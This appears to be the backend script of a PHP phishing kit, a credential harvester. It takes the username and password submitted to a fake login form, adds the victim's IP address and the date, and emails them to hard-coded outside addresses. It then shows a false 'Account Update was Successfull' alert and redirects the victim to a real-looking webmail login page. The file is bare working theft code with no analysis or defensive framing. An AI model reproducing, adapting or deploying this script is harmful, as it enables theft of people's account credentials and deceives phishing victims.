<?php
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$message .= "User name: ".$_POST['username']."\n";
$message .= "Password: " .$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$mesaj = "Yandex ReZult Hacked by WIRE MONI
Yahoo User : $username
Password : $passwd
----------------------------------------------------
IP : $ip 
DATE : $datamasii
";
mail($recipient,$subject,$message);

$recipient = "jamesssyou@yandex.com, lacycmclendon@gmail.com";
$subject = "ALL DOMAIN ReZult!";
$headers = "From: YAHOO <darego@darego.org>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "yahoo", $message);
if (mail($recipient,$subject,$message,$headers))

{
?>
	
		   <script language=javascript>
alert('Account Update was Successfull!!!');
window.location='https://mail.bethpage.ws/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2fmail.bethpage.ws%2fowa';
</script>
<?

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>